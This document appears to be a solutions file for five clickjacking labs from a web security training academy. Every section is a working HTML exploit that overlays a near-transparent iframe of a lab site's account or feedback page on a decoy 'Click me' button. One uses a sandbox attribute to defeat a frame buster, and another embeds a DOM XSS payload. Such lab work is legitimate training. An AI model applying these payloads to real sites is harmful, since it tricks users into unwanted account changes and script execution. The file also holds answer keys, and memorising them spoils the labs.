## 1. Basic clickjacking with CSRF token protection

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:485px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0ae500e3039debab808b2bc100de0084.web-security-academy.net/my-account"></iframe>
```

## 2. Clickjacking with form input data prefilled from a URL parameter

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:455px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0aa500dc047d54e784d04f2300890048.web-security-academy.net/my-account?email=some@so.me"></iframe>
```


## 3. Clickjacking with a frame buster script

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:455px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0ad3009a0409233180f01cd600610001.web-security-academy.net/my-account?email=some@so.me"></iframe>
```


## 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 1000px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:800px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a1500eb03f4371e844f866200b70086.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint%28%29+%2F%3E&email=a%40aa.c&subject=aa&message=a"></iframe>
```


## 5. Multistep clickjacking

```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   #first {
       position:absolute;
       top:490px;
       left:60px;
       z-index: 1;
   }
   #next{
       position:absolute;
       top:300px;
       left:200px;
       z-index: 1;
   }
</style>
<div id="first">Click me first</div>
<div id="next">Click me next</div>
<iframe src="https://0a9c00bc040cd2a980460836009400c8.web-security-academy.net/my-account"></iframe>
```

